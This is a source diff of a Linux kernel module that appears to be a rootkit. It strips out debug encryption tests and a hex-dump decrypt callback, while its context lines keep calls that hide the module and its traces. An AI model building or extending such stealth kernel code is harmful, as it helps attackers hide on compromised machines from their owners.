@@ -68,9 +68,6 @@ static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 
-//XXX debug
-static struct kv_crypto_st *kvmgc0, *kvmgc1;
-
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
 #error "fuuuuuu Support is only for x86-64"
@@ -826,25 +823,6 @@ cont:
 
     kv_scan_and_hide();
 
-    /** debug */
-    kvmgc0 =crypto_init();
-    if (kvmgc0) {
-        size_t datalen = 64;
-        u8 buf[datalen];
-        memset(buf, 'A', datalen);
-        kv_encrypt(kvmgc0, buf, datalen);
-    }
-
-    kvmgc1 =crypto_init();
-    if (kvmgc1) {
-        size_t datalen = 64;
-        u8 buf[datalen];
-
-        /** go random this time */
-        get_random_bytes(buf, datalen);
-        kv_encrypt(kvmgc1, buf, datalen);
-    }
-
 #ifndef DEBUG_RING_BUFFER
     kv_hide_mod();
     op_lock = 1;
@@ -873,18 +851,7 @@ leave:
     return rv;
 }
 
-/** example decrypt */
-void _decrypt_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
-    if (userdata) {
-        char *name = (char*)userdata;
-        prinfo("Called from: '%s'\n", name);
-    }
-    print_hex_dump(KERN_DEBUG, "decrypted text: ",
-            DUMP_PREFIX_NONE, 16, 1, buf, buflen, true);
-}
-
 static void __exit kv_cleanup(void) {
-    decrypt_callback cb = (decrypt_callback)_decrypt_callback;
 
     sys_deinit();
     kv_pid_cleanup();
@@ -908,12 +875,6 @@ static void __exit kv_cleanup(void) {
 
     fs_names_cleanup();
 
-    /** debug */
-    kv_decrypt(kvmgc0, cb, "debug: kvmgc0");
-    kv_decrypt(kvmgc1, cb, "debug: kvmgc1");
-
-    kv_crypto_mgc_deinit(kvmgc0);
-    kv_crypto_mgc_deinit(kvmgc1);
     kv_crypto_deinit();
 
     prinfo("unloaded.\n");
